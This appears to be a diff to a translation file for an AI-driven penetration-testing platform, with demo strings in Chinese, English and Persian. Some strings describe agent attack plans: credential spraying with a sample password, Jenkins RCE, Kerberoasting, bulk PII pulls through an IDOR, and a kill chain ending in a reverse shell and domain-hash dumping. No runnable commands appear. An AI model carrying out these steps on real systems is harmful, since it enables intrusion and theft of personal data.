+    "en": "intents=[\n  { summary: 'Use dmz-web01 as a pivot for host discovery and port identification on the internal 10.10.10.0/24', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n  { summary: 'Internal lateral movement: reuse the hardcoded password sa/Acme@2021 for credential reuse and password spraying', parent_ids: [faCreds], priority: 8 },\n  { summary: 'Unauthenticated /script Groovy execution (RCE) on internal Jenkins (10.10.10.20)', parent_ids: [fa6], priority: 9 },\n  { summary: 'Kerberoasting against domain service accounts, then offline cracking', parent_ids: [fa6], priority: 8 },\n]\nHost discovery is the prerequisite (dispatch it first). The other three are parallel lateral-movement angles.",
+    "fa": "intents=[\n  { summary: 'استفاده از dmz-web01 به‌عنوان pivot برای کشف میزبان و شناسایی درگاه در شبکه داخلی 10.10.10.0/24', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n  { summary: 'حرکت عرضی داخلی: استفاده دوباره از گذرواژه سخت‌کد sa/Acme@2021 برای استفاده مجدد از اعتبارنامه و پاشش گذرواژه', parent_ids: [faCreds], priority: 8 },\n  { summary: 'اجرای Groovy بدون احراز هویت روی /script (RCE) در Jenkins داخلی (10.10.10.20)', parent_ids: [fa6], priority: 9 },\n  { summary: 'Kerberoasting روی حساب‌های سرویس دامنه و شکستن آفلاین', parent_ids: [fa6], priority: 8 },\n]\nکشف میزبان پیش‌نیاز است (اول فرستاده شود). سه مورد دیگر زاویه‌های موازی حرکت عرضی‌اند."
+  },
+  "对照本轮 worker 产出：i9→fa7「内网存活 DC01/FS01/JENKINS」；i11→fa8「Jenkins /script 无鉴权 Groovy」+ fa9「从 Jenkins 凭据库导出 acme\\svc_deploy 明文口令」；i12→fa10「Kerberoast svc_sql TGS，hashcat 破出 Sql@2020」。svc_deploy 属 Domain Admins，i13 已用其 psexec 拿下 DC01 并 secretsdump。g4 验收（拿下 DC01）应已达成，先核对 finding 证据链再盖章。": {
+    "en": "Checked against this round's worker output: i9→fa7 \"live internal hosts DC01/FS01/JENKINS\"; i11→fa8 \"Jenkins /script unauthenticated Groovy\" + fa9 \"plaintext password for acme\\svc_deploy exported from the Jenkins credential store\"; i12→fa10 \"Kerberoast of svc_sql TGS, hashcat cracked Sql@2020\". svc_deploy is in Domain Admins. i13 already used it with psexec to take DC01 and run secretsdump. Acceptance for g4 (take DC01) should already be met. Check the finding evidence chain before signing off.",
+    "fa": "با خروجی worker این دور مقابله شد: i9→fa7 «میزبان‌های زنده داخلی DC01/FS01/JENKINS»؛ i11→fa8 «Groovy بدون احراز هویت روی Jenkins /script» + fa9 «گذرواژه متن روشن acme\\svc_deploy از مخزن اعتبارنامه Jenkins»؛ i12→fa10 «Kerberoast برای TGS حساب svc_sql، و hashcat گذرواژه Sql@2020 را شکست». svc_deploy عضو Domain Admins است. i13 قبلاً با psexec همان حساب DC01 را گرفته و secretsdump زده. پذیرش g4 (گرفتن DC01) باید محقق شده باشد. پیش از مهر کردن، زنجیره شاهد finding را بررسی کنید."
+  },
+  "intents=[\n  { summary: '已登入 admin 后台，枚举用户管理/导出接口并批量拉取用户敏感字段', asset_ids: [admin], parent_ids: [fa1], priority: 9 },\n  { summary: 'api.acme.com 订单 IDOR 遍历 order_id 批量拉取用户订单/PII', asset_ids: [api], parent_ids: [fa2], priority: 9 },\n]\n注：i3/i5 已在 running，本轮以更精准的取数描述 + 提优先级(→9)加码，不重复派同义意图。": {
+    "en": "intents=[\n  { summary: 'Already signed in to the admin console; enumerate user-management and export endpoints and pull sensitive user fields in bulk', asset_ids: [admin], parent_ids: [fa1], priority: 9 },\n  { summary: 'Walk order_id on the api.acme.com order IDOR and pull user orders and PII in bulk', asset_ids: [api], parent_ids: [fa2], priority: 9 },\n]\nNote: i3/i5 are already running. This round tightens the data-extraction wording and raises priority (→9). Do not dispatch the same intent again.",
+    "fa": "intents=[\n  { summary: 'ورود به کنسول admin انجام شده؛ رابط مدیریت کاربر و خروجی را بشمار و فیلدهای حساس کاربر را یکجا بگیر', asset_ids: [admin], parent_ids: [fa1], priority: 9 },\n  { summary: 'پیمایش order_id در IDOR سفارش api.acme.com و گرفتن یکجای سفارش و PII کاربران', asset_ids: [api], parent_ids: [fa2], priority: 9 },\n]\nیادداشت: i3/i5 هم‌اکنون running هستند. این دور توصیف استخراج داده را دقیق‌تر می‌کند و اولویت را بالا می‌برد (→9). قصد هم‌معنا را دوباره نفرست."
+  },
+  "www.acme.com [200] Acme Corp\nadmin.acme.com [200] Acme Admin 登录\napi.acme.com [401]\nshop.acme.com [200]\nvpn.acme.com [200]": {
+    "en": "www.acme.com [200] Acme Corp\nadmin.acme.com [200] Acme Admin login\napi.acme.com [401]\nshop.acme.com [200]\nvpn.acme.com [200]",
+    "fa": "www.acme.com [200] Acme Corp\nadmin.acme.com [200] ورود Acme Admin\napi.acme.com [401]\nshop.acme.com [200]\nvpn.acme.com [200]"
+  },
+  "FS01 [+] acme.local\\sa:Acme@2021 (Pwn3d!)\nDC01 [-] 认证失败": {
+    "en": "FS01 [+] acme.local\\sa:Acme@2021 (Pwn3d!)\nDC01 [-] authentication failed",
+    "fa": "FS01 [+] acme.local\\sa:Acme@2021 (Pwn3d!)\nDC01 [-] احراز هویت ناموفق بود"
+  },
+  "HTTP/1.1 200 OK\nContent-Type: application/json\nContent-Length: 655\n\n{\n  \"order_id\": 1002,\n  \"user_id\": 77,\n  \"amount\": 1299.00,\n  \"address\": \"北京市朝阳区 ****\",\n  \"phone\": \"138****6021\",\n  \"items\": [{ \"sku\": \"A-100\", \"qty\": 1 }]\n}": {
+    "en": "HTTP/1.1 200 OK\nContent-Type: application/json\nContent-Length: 655\n\n{\n  \"order_id\": 1002,\n  \"user_id\": 77,\n  \"amount\": 1299.00,\n  \"address\": \"Chaoyang District, Beijing ****\",\n  \"phone\": \"138****6021\",\n  \"items\": [{ \"sku\": \"A-100\", \"qty\": 1 }]\n}",
+    "fa": "HTTP/1.1 200 OK\nContent-Type: application/json\nContent-Length: 655\n\n{\n  \"order_id\": 1002,\n  \"user_id\": 77,\n  \"amount\": 1299.00,\n  \"address\": \"منطقه چائویانگ، پکن ****\",\n  \"phone\": \"138****6021\",\n  \"items\": [{ \"sku\": \"A-100\", \"qty\": 1 }]\n}"
+  },
+  "你是 ARTEX 的「": {
+    "en": "You are the ARTEX \"",
+    "fa": "شما «"
+  },
+  "」。\n目标：{{.Goal}}\n资产概览：{{.AssetSummary}}\n路线提示：{{.RouteHint}}\n请基于以上信息推进探索，并通过工具把结果写回图。": {
+    "en": "\".\nGoal: {{.Goal}}\nAsset overview: {{.AssetSummary}}\nRoute hint: {{.RouteHint}}\nContinue exploring from the information above, and write results back to the graph with tools.",
+    "fa": "» در ARTEX هستید.\nهدف: {{.Goal}}\nنمای دارایی‌ها: {{.AssetSummary}}\nراهنمای مسیر: {{.RouteHint}}\nبر پایه این اطلاعات اکتشاف را پیش ببرید و نتیجه‌ها را با ابزارها در گراف بنویسید."
+  },
+  "# 检查摘要\n\n本轮验证已完成，整理已有证据与后续建议。": {
+    "en": "# Check summary\n\nThis round of verification is done. The evidence already collected and the next recommendations are organized below.",
+    "fa": "# خلاصه بررسی\n\nبررسی این دور تمام شد. شواهد موجود و پیشنهادهای بعدی در ادامه مرتب شده‌اند."
+  },
+  "请整理已经完成的检查，将结论和证据索引写入 reports/summary.md。\n保留待验证项，不修改业务数据。": {
+    "en": "Organize the checks that are already finished, and write the conclusions and evidence index to reports/summary.md.\nKeep items that still need verification, and do not change business data.",
+    "fa": "بررسی‌های تمام‌شده را مرتب کنید و نتیجه و نمایه شواهد را در reports/summary.md بنویسید.\nموارد هنوز نیازمند بررسی را نگه دارید و داده کسب‌وکار را تغییر ندهید."
+  },
+  "已读取 3 条证据索引。\n记录包含请求时间、结果摘要和本地文件位置。": {
+    "en": "Read 3 evidence-index entries.\nThe records include request time, a result summary, and the local file location.",
+    "fa": "۳ نمایه شاهد خوانده شد.\nرکوردها شامل زمان درخواست، خلاصه نتیجه و محل فایل محلی‌اند."
+  },
+  "Successfully wrote reports/summary.md\n共写入 68 个字符。": {
+    "en": "Successfully wrote reports/summary.md\nWrote 68 characters.",
+    "fa": "Successfully wrote reports/summary.md\n۶۸ نویسه نوشته شد."
+  },
+  "完整杀伤链：\n1. .git 泄露→源码白盒+硬编码凭据\n2. shop Fastjson RCE→DMZ 反弹 shell\n3. sudo 提权→root 立足\n4. 内网发现→DC01/FS01/Jenkins\n5. Jenkins 未授权→导出域凭据 svc_deploy\n6. Kerberoasting→破解 svc_sql\n7. svc_deploy∈Domain Admins→psexec DC01→secretsdump 全域哈希\n\n四个目标全部达成，17 个发现（7 高/4 中/2 低 + 8 内网链路）。": {
+    "en": "Full kill chain:\n1. .git leak → white-box source plus hardcoded credentials\n2. shop Fastjson RCE → reverse shell on the DMZ\n3. sudo privilege escalation → root foothold\n4. Internal discovery → DC01/FS01/Jenkins\n5. Unauthenticated Jenkins → exported domain credential svc_deploy\n6. Kerberoasting → cracked svc_sql\n7. svc_deploy ∈ Domain Admins → psexec DC01 → secretsdump of every domain hash\n\nAll four goals were met: 17 findings (7 high / 4 medium / 2 low + 8 internal-path items).",
+    "fa": "زنجیره کامل حمله:\n1. نشت .git → سورس جعبه سفید و اعتبارنامه سخت‌کد\n2. Fastjson RCE روی shop → reverse shell در DMZ\n3. ارتقای دسترسی با sudo → جای پای root\n4. کشف داخلی → DC01/FS01/Jenkins\n5. Jenkins بدون احراز هویت → صدور اعتبارنامه دامنه svc_deploy\n6. Kerberoasting → شکستن svc_sql\n7. svc_deploy ∈ Domain Admins → psexec روی DC01 → secretsdump همه هش‌های دامنه\n\nهر چهار هدف محقق شد: ۱۷ یافته (۷ بالا / ۴ متوسط / ۲ پایین + ۸ پیوند داخلی)."
+  },
+  "# 工作区笔记\n\n（demo）这是工作空间根目录下的示例文件，可在线编辑并保存。\n": {
+    "en": "# Workspace notes\n\n(demo) This is a sample file in the workspace root. You can edit it online and save it.\n",
+    "fa": "# یادداشت فضای کار\n\n(demo) این یک فایل نمونه در ریشه فضای کار است. می‌توانید آنلاین ویرایش و ذخیره کنید.\n"
+  },
+  "<!-- (demo) 抓到的响应体片段 -->\n<html><body>MySQL error near ''1'='1'</body></html>\n": {
+    "en": "<!-- (demo) captured response-body fragment -->\n<html><body>MySQL error near ''1'='1'</body></html>\n",
+    "fa": "<!-- (demo) تکه بدنه پاسخ گرفته‌شده -->\n<html><body>MySQL error near ''1'='1'</body></html>\n"
+  },
+  "HTTP/1.1 200 OK\nContent-Length: 12034\n<html>… 搜索结果页 …</html>": {
+    "en": "HTTP/1.1 200 OK\nContent-Length: 12034\n<html>… search results page …</html>",
+    "fa": "HTTP/1.1 200 OK\nContent-Length: 12034\n<html>… صفحه نتیجه جستجو …</html>"
+  },
+  "### 演示记录\n\n已关联原漏洞。此环境未连接真实 Agent，也未向目标发送请求；请在实际部署中执行复测。": {
+    "en": "### Demo record\n\nLinked to the original vulnerability. This environment is not connected to a real Agent and did not send a request to the target. Run the retest in a real deployment.",
+    "fa": "### رکورد نمایشی\n\nبه آسیب‌پذیری اصلی پیوند شد. این محیط به Agent واقعی وصل نیست و درخواستی به هدف نفرستاده است. آزمون مجدد را در استقرار واقعی اجرا کنید."
+  },
+  " 直接继承，暂不能归档": {
+    "en": " directly inherits it, so it cannot be archived yet",
+    "fa": " مستقیماً آن را به ارث برده، پس فعلاً نمی‌توان بایگانی کرد"
+  },
+  "归档仍被任务 #": {
+    "en": "Archiving is still required by task #",
+    "fa": "بایگانی هنوز برای وظیفه # لازم است"
+  },
+  " 依赖，无法永久删除": {
+    "en": ", so it cannot be permanently deleted",
+    "fa": "، پس حذف دائمی ممکن نیست"
+  },
+  "资产 #": {
+    "en": "Asset #",
+    "fa": "دارایی #"
+  },
+  "任务创建时关联企业：": {
+    "en": "Company linked when the task was created: ",
+    "fa": "شرکت مرتبط هنگام ساخت وظیفه: "
+  },
+  "第 ": {
+    "en": "Line ",
+    "fa": "خط "
+  },
+  " 条范围无效：": {
+    "en": " has an invalid scope: ",
+    "fa": " محدوده نامعتبر دارد: "
+  },
+  "复测 #": {
+    "en": "Retest #",
+    "fa": "آزمون مجدد #"
+  },
+  "请复测漏洞 #": {
+    "en": "Please retest vulnerability #",
+    "fa": "لطفاً دوباره بیازمایید آسیب‌پذیری #"
+  },
+  "# SKILL.md\n\n（demo）这是该 skill 的说明文件示例。": {
+    "en": "# SKILL.md\n\n(demo) This is a sample description file for this skill.",
+    "fa": "# SKILL.md\n\n(demo) این یک فایل نمونه توضیح برای این skill است."
+  }
+}
